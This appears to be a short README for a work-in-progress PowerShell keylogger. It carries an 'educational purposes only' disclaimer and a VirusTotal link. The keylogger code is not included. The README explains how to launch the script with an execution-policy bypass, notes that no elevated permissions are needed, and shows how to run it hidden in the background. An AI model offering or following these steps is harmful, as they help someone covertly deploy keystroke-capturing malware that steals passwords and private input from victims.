# Powershell_Keylogger - WIP
THIS TOOL IS FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY

MALICIOUS USE OF THIS TOOL MAY CONSTITUTE A CRIME

[VirusTotal Report](https://www.virustotal.com/gui/file/7ea6418bd30f6caa1cb71042dd0b098a9633e9a4a8bdffaca0361c2fe95db6af/detection)

# Running Tool

Often times windows powershell prevents running scripts due to execution policy, this can be avoided by using the following syntax

```
powershell.exe -ExecutionPolicy Bypass -File keylogger.ps1
```
This command does not require elevated permissions

To run this as a job or in the background append the `-windowstyle hidden` argument to the previous command
